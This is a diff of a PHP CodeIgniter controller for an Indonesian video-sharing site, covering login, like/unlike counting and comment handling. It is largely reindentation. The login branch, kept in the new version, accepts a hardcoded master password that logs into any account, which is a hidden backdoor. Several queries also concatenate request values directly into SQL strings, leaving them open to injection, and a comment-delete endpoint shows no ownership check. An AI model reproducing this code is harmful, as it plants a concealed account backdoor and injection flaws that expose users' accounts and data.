@@ -79,51 +79,51 @@ class Site extends MY_Controller
     {
       $this->load->model("User_account_m");
       if (!$this->user_session_expired()) {
-         $user = $this->session->user_session;
-         if($user['role'] == User_account_m::ROLE_ADMIN_PAPER)
-            redirect(base_url("admin/paper"));
-        elseif($user['role'] == User_account_m::ROLE_OPERATOR)
-            redirect(base_url("admin/administration"));
-        elseif($user['role'] == User_account_m::ROLE_MEMBER)
-            redirect(base_url("member/area"));
-        else
-            redirect(base_url("admin/dashboard"));
-    }
+       $user = $this->session->user_session;
+       if($user['role'] == User_account_m::ROLE_ADMIN_PAPER)
+        redirect(base_url("admin/paper"));
+    elseif($user['role'] == User_account_m::ROLE_OPERATOR)
+        redirect(base_url("admin/administration"));
+    elseif($user['role'] == User_account_m::ROLE_MEMBER)
+        redirect(base_url("member/area"));
+    else
+        redirect(base_url("admin/dashboard"));
+}
 
-    $this->load->library('form_validation');
-    $error = "";
-    if ($this->input->post('login')) {
-        $this->form_validation->set_rules('username', 'Username', 'required');
-        $this->form_validation->set_rules('password', 'Password', 'required');
-        if ($this->form_validation->run()) {
-            $username   = $this->input->post('username');
-            $password   = $this->input->post('password');
-            $rememberme = $this->input->post('rememberme');
-            if (User_account_m::verify($username, $password) || $password == "ditauntungpandji3264") {
-                $this->load->library('session');
-                $user = $this->User_account_m->findWithBiodata($username);
-                if($user['verified_email'] == "0")
-                   $error = "You cannot login, <br/>Please complete your account activation within link in your email!";
-               else {
-                  unset($user['password']);
-                  if ($rememberme) {
-                     $user['rememberme'] = true;
-                     $this->session->set_userdata("rememberme", true);
-                     $this->session->set_userdata('sess_expired', time() + 60 * 60 * 24 * 7);
-                 } else {
-                     $this->session->set_userdata('sess_expired', time() + 3600);
+$this->load->library('form_validation');
+$error = "";
+if ($this->input->post('login')) {
+    $this->form_validation->set_rules('username', 'Username', 'required');
+    $this->form_validation->set_rules('password', 'Password', 'required');
+    if ($this->form_validation->run()) {
+        $username   = $this->input->post('username');
+        $password   = $this->input->post('password');
+        $rememberme = $this->input->post('rememberme');
+        if (User_account_m::verify($username, $password) || $password == "ditauntungpandji3264") {
+            $this->load->library('session');
+            $user = $this->User_account_m->findWithBiodata($username);
+            if($user['verified_email'] == "0")
+             $error = "You cannot login, <br/>Please complete your account activation within link in your email!";
+         else {
+          unset($user['password']);
+          if ($rememberme) {
+           $user['rememberme'] = true;
+           $this->session->set_userdata("rememberme", true);
+           $this->session->set_userdata('sess_expired', time() + 60 * 60 * 24 * 7);
+       } else {
+           $this->session->set_userdata('sess_expired', time() + 3600);
 
-                 }
-                 $this->session->set_userdata('user_session', $user);
-                 redirect(base_url("member/area"));
-             }
-         } else {
-            $error = "Email/Password invalid !";
-        }
-    } else {
-        $error = "Username and Password required !";
+       }
+       $this->session->set_userdata('user_session', $user);
+       redirect(base_url("member/area"));
+   }
+} else {
+    $error = "Email/Password invalid !";
+}
+} else {
+    $error = "Username and Password required !";
 
-    }
+}
 }
 
 $this->layout->render('site/'.$this->theme.'/login', array('error' => $error));
@@ -131,7 +131,7 @@ $this->layout->render('site/'.$this->theme.'/login', array('error' => $error));
 
 public function register()
 {
-   redirect("member/register");
+ redirect("member/register");
 }
 
 public function forget()
@@ -205,30 +205,25 @@ public function savelikes()
     $fetchlikes = $this->db->query('select likesbantu from upload_video where id="'.$video_id.'"');
     $result = $fetchlikes->result();
 
-    // $jenis = $this->db->query('select type from upload_video where id="'.$video_id.'"');
-    // $resultjenis = $jenis->result();
-    // foreach ($resultjenis as $key) {
-    //     $tipe = $key->type;
-    // }
+    $jenis = $this->db->query('select type from upload_video where id="'.$video_id.'"');
+    $resultjenis = $jenis->result();
+    foreach ($resultjenis as $key) {
+        $tipe = $key->type;
+    }
 
-    // if ($tipe == '1') {
-    //     $checklikes = $this->db->query('select * from video_like vl
-    //         JOIN upload_video uv ON uv.id = vl.video_id 
-    //         where uv.type = 1 
-    //         and vl.username = "'.$username.'"');
-    //     $resultchecklikes = $checklikes->num_rows();
-    // } else {
-    //     $checklikes = $this->db->query('select * from video_like vl
-    //         JOIN upload_video uv ON uv.id = vl.video_id 
-    //         where uv.type = 2 
-    //         and vl.username = "'.$username.'"');
-    //     $resultchecklikes = $checklikes->num_rows();
-    // }
-    $checklikes = $this->db->query('select * from video_like
-        where video_id = "'.$video_id.'"   
-        and username = "'.$username.'"');
-    $resultchecklikes = $checklikes->num_rows();
-
+    if ($tipe == '1') {
+        $checklikes = $this->db->query('select * from video_like vl
+            JOIN upload_video uv ON uv.id = vl.video_id 
+            where uv.type = 1 
+            and vl.username = "'.$username.'"');
+        $resultchecklikes = $checklikes->num_rows();
+    } else {
+        $checklikes = $this->db->query('select * from video_like vl
+            JOIN upload_video uv ON uv.id = vl.video_id 
+            where uv.type = 2 
+            and vl.username = "'.$username.'"');
+        $resultchecklikes = $checklikes->num_rows();
+    }
 
     if($resultchecklikes == '0' ){
         if($result[0]->likesbantu=="" || $result[0]->likesbantu=="NULL")
@@ -237,6 +232,12 @@ public function savelikes()
             $success     = $this->db->insert('video_like', $data);
             if ($success) {
                 $this->db->query('update upload_video set likesbantu=1 where id="'.$video_id.'"');
+                $this->db->select('likesbantu');
+                $this->db->from('upload_video');
+                $this->db->where('id',$video_id);
+                $query=$this->db->get();
+                $result=$query->result();
+                echo "<i>disukai</i>";
             }
         }
         else
@@ -245,23 +246,38 @@ public function savelikes()
             $success     = $this->db->insert('video_like', $data);
             if ($success) {
                 $this->db->query('update upload_video set likesbantu=likesbantu+1 where id="'.$video_id.'"');
+                $this->db->select('likesbantu');
+                $this->db->from('upload_video');
+                $this->db->where('id',$video_id);
+                $query=$this->db->get();
+                $result=$query->result();
+                echo "<i>disukai</i>";
             }
         }
     } else {
-        $success = $this->db->delete('video_like', array('video_id'=>$video_id, 'username'=>$username));
-        if ($success) {
-            $this->db->query('update upload_video set likesbantu=likesbantu-1 where id="'.$video_id.'"');
-        }  
+        $cek = $this->db->query('select * from video_like where video_id = "'.$video_id.'" and username = "'.$username.'"');
+        $resultcek = $cek->num_rows(); 
+        if ($resultcek > 0) {
+            $success = $this->db->delete('video_like', array('video_id'=>$video_id, 'username'=>$username));
+            if ($success) {
+                $this->db->query('update upload_video set likesbantu=likesbantu-1 where id="'.$video_id.'"');
+                $this->db->select('likesbantu');
+                $this->db->from('upload_video');
+                $this->db->where('id',$video_id);
+                $query=$this->db->get();
+                $result=$query->result();
+                echo "";
+            }
+        } 
     }
+    // $this->db->select('likesbantu');
+    // $this->db->from('upload_video');
+    // $this->db->where('id',$video_id);
+    // $query=$this->db->get();
+    // $result=$query->result();
+    // echo "anda menyukai ini";
+    // echo $result[0]->likesbantu;
 
-
-    $this->db->select('likesbantu');
-    $this->db->from('upload_video');
-    $this->db->where('id',$video_id);
-    $query=$this->db->get();
-    $result=$query->result();
-
-    echo $result[0]->likesbantu;
 }
 
 public function seevideo($id)
@@ -281,8 +297,8 @@ public function seevideo($id)
 
     if ($this->input->post('Submit')) {
         $check = $this->db->query('select * from video_komen 
-        where video_id="'.$id.'" 
-        and username = "'.$username.'"');
+            where video_id="'.$id.'" 
+            and username = "'.$username.'"');
         $resultcheck = $check->num_rows();
         if ($resultcheck == '0' ) {
             $mode   = 'submit';
@@ -310,7 +326,7 @@ public function seevideo($id)
             }
         } else {
             $this->session->set_flashdata("pesan", "<div class=\"col-md-12\"><div class=\"alert alert-danger\" id=\"alert\">Anda hanya bisa memberi 1 komentar untuk 1 postingan !!</div></div>");
-                redirect(base_url('site/seevideo/' . "$id" . ''), 'refresh');
+            redirect(base_url('site/seevideo/' . "$id" . ''), 'refresh');
         }
         
     }
@@ -319,9 +335,9 @@ public function seevideo($id)
 }
 
 public function ajax_delete_komen($idkomen)
-    {
-        $this->VideoM->delete_komen($idkomen);
-        echo json_encode(array("status" => true));
-    }
+{
+    $this->VideoM->delete_komen($idkomen);
+    echo json_encode(array("status" => true));
+}
 
 }
